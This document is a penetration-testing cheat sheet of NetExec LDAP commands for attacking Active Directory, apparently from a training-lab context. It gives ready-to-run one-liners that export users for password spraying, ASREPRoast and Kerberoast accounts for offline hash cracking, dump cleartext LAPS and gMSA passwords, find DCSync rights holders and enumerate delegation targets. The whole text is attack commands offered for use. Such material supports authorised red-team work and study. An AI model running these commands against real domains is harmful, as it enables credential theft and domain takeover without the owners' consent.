# NetExec LDAP

### Bloodhound collector ALL

Run the BloodHound `all` collection method (sessions, ACLs, GPOs, trusts, etc.) over LDAP against the domain, using the target's DNS for name resolution.

```sh title:"Full collection over LDAP, target DC as DNS resolver"
nxc ldap $domain -u $user $auth_flags --bloodhound -c all --dns-server $domain
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### User enumeration

Enumerate all domain users over LDAP and export the list to `users.txt` for later spraying, ASREPRoasting, or Kerberoasting.

```sh title:"Export to users.txt for spraying/roasting"
nxc ldap $domain -u $user $auth_flags --users-export users.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump gMSA accounts

Retrieve managed service account passwords (ReadGMSAPassword) that the authenticated principal has rights to read. Classic privesc path when a user/group can read gMSA secrets.

```sh title:"Read ReadGMSAPassword-protected blobs via LDAP"
nxc ldap $domain -u $user $auth_flags --gmsa    
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Arbitrary LDAP query

Run an arbitrary LDAP filter against the domain - useful for targeted enumeration when the canned modules don't fit.

```sh title:"Execute a custom filter when canned modules don't fit"
nxc ldap $domain -u $user $auth_flags --query '$ldap_query' ""
```
<!-- cheat
import passwords
import domain_ip
import users
import ldap_query
import nxc_auth
-->

### ASREPRoast unauthenticated

Iterate a userlist with no password and collect AS-REP hashes for any account with Kerberos pre-auth disabled. Works without valid creds.

```sh title:"Spray userlist with empty password, no creds required"
nxc ldap $domain -u $users_file -p '' --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ASREPRoast authenticated

Authenticated version - query LDAP for `DONT_REQ_PREAUTH` accounts and grab their AS-REP hashes for offline cracking.

```sh title:"Query LDAP for DONT_REQ_PREAUTH accounts with valid creds"
nxc ldap $domain -u $user $auth_flags --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ADIDNS records

Pull DNS records from AD-integrated DNS (ADIDNS) to map internal hostnames, subnets, and services without port scanning.

```sh title:"Map internal hosts without port scanning (get-network module)"
nxc ldap $domain -u $user $auth_flags -M get-network -o ALL=true
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### LAPS passwords

Read LAPS (Local Administrator Password Solution) passwords via LDAP. Returns cleartext local admin passwords for any computer object the principal can read `ms-Mcs-AdmPwd` on.

```sh title:"Read ms-Mcs-AdmPwd cleartext from readable computer objects"
nxc ldap $domain -u $user $auth_flags -M laps
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Machine Account Quota

Check the domain's `ms-DS-MachineAccountQuota` value - if >0, any authenticated user can join machines to the domain (enables Resource-Based Constrained Delegation attacks).

```sh title:"Check ms-DS-MachineAccountQuota (RBCD prereq if >0)"
nxc ldap $domain -u $user $auth_flags -M maq
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### DCSync rights holders

Read the domain root DACL and find principals holding `DS-Replication-Get-Changes` / `-All` - i.e. who can DCSync.

```sh title:"Read domain DACL for Get-Changes / Get-Changes-All"
nxc ldap $domain -u $user $auth_flags -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc kerberoasting

### Kerberoasting

Request service tickets for all SPN-enabled accounts and save TGS hashes for offline cracking.

```sh title:"Request TGS for every SPN-enabled account, save to file"
nxc ldap $domain -u $user $auth_flags --kerberoasting $hashes_file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var hashes_file
-->

### Trusted for delegation

List accounts with unconstrained or constrained delegation flags set - these are high-value targets (compromise → domain compromise in many cases).

```sh title:"List unconstrained/constrained delegation principals"
nxc ldap $domain -u $user $auth_flags --trusted-for-delegation
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc config generation

### Generate krb5.conf

Generate a `/etc/krb5.conf` pointed at the target DC so Kerberos tooling (impacket, rubeus via wine, etc.) can request tickets without manual config editing.

```sh title:"Write config pointed at target DC, move to /etc/"
nxc smb $domain -u $user $auth_flags --generate-krb5-file krb5.conf && sudo mv krb5.conf /etc/krb5.conf
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->
